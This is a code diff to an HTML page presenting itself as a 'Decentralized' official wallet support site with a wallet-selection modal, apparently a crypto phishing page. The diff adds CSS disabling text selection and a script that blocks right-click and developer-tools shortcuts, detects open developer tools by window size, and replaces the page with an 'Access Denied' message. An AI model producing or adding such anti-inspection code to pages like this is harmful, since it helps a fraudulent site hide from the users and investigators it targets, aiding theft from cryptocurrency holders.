@@ -15,6 +15,14 @@
   <meta property="og:title" content="Decentralized | Official Support web">
   <meta property="og:description" content="Rectify your issues securely.">
   <meta property="og:type" content="website">
+  <style>
+  body, * {
+    user-select: none !important;
+    -webkit-user-select: none !important;
+    -moz-user-select: none !important;
+    -ms-user-select: none !important;
+  }
+</style>
 </head>
 <body>
 
@@ -655,7 +663,38 @@
       if (e.key === 'Escape') closeSelectWalletModal();
     });
   </script>
+
+  <script>
+  // Disable right-click context menu
+  document.addEventListener('contextmenu', e => e.preventDefault());
+
+  // Disable common DevTools shortcuts
+  document.addEventListener('keydown', e => {
+    // F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U
+    if (e.keyCode == 123 || 
+        (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 74)) || 
+        (e.ctrlKey && e.keyCode == 85)) {
+      e.preventDefault();
+      return false;
+    }
+  });
+
+  // Optional: Detect DevTools open and blur or redirect
+  let devtoolsOpen = false;
+  setInterval(() => {
+    if (window.outerHeight - window.innerHeight > 200 || 
+        window.outerWidth - window.innerWidth > 200) {
+      if (!devtoolsOpen) {
+        devtoolsOpen = true;
+        document.body.innerHTML = '<h1 style="text-align:center;margin-top:50px;color:red;">Developer Tools Detected — Access Denied</h1>';
+      }
+    } else {
+      devtoolsOpen = false;
+    }
+  }, 1000);
+</script>
 </body>
 
 </html>
+
 
